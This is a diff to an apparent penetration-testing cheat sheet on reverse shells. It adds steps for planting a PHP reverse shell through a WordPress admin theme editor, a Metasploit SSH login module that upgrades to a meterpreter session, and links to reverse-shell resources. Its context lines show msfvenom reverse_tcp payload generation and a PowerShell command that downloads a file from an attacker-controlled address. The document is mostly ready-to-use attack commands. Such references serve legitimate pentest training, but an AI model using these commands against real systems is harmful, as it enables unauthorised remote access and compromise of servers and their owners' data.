@@ -19,6 +19,14 @@ set payload windows/(x64)/meterpreter/reverse_tcp
 ## Payload
 ___
 
+### PHP
+- Get reverse shell from Wordpress admin dashboard using themes edition
+```
+Login as admin, and edit a theme's php file.
+Replace content with Pentest Monkey's php-reverse-shell
+Browse file : http://hostname/wordpress/wp-content/themes/themename/file.php
+```
+
 ### Windows
 - Reverse shell with nishang Invoke-PowershellTcp
 ```powershell
@@ -44,6 +52,17 @@ powershell (New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shel
 ```
 
 ### Metasploit
+
+- Get meterpreter session with SSH login
+```sh
+use auxiliary/scanner/ssh/ssh_login
+set rhosts 0.0.0.0
+set username user
+set password pass
+run
+sessions -u 1
+```
+
 - Exe Payload
 ```sh
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<local ip address> LPORT=<local listening port> -f exe > shell.exe
@@ -79,7 +98,11 @@ export TERM=xterm
 ## Links
 ___
 ### Guides
-- 
+- https://www.hackingarticles.in/wordpress-reverse-shell/
+- https://github.com/pentestmonkey/php-reverse-shell
+- http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
+- https://netsec.ws/?p=331
+- https://gtfobins.github.io/
 
 ### Writeups
 - 
